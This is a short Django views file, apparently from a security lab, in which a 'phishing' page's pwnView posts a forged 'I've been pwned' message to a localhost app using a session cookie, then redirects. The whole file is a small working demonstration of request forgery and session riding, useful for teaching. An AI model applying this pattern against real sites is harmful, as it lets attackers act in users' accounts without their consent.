import datetime
import requests

from django.shortcuts import render, redirect


# Create your views here.
def mainView(request):
  return render(request, 'phishing.html')

def pwnView(request):
  session_id = request.session.session_key
  timestamp = datetime.datetime.now().strftime("%d/%m/%y %H:%M:%S")
  url = "http://localhost:8000/send"
  form_data = {"message": "I've been pwned on " + timestamp}
  cookies = {"sessionid": session_id}

  requests.post(url, data=form_data, cookies=cookies)

  return redirect('http://localhost:8000')
